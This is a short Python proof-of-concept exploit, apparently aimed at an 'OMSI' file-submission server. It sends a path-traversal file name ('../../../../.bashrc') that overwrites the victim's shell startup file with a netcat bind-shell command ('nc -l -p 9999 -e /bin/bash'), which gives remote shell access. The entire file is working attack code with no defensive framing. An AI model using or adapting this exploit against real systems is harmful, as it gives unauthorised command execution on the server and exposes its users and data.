import socket

HOST = "<OMSI Server IP>"
PORT = <OMSI Server Port>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send("OMSI0001\x00../../../../.bashrc\x00me@ucdavis.edu\x0010.0.0.1")
data = s.recv(1024)
if data == 'ReadyToAcceptClientFile':
   s.send("nohup nc -l -p 9999 -e /bin/bash 2> /dev/null &")
data2 = s.recv(1024)
s.close()
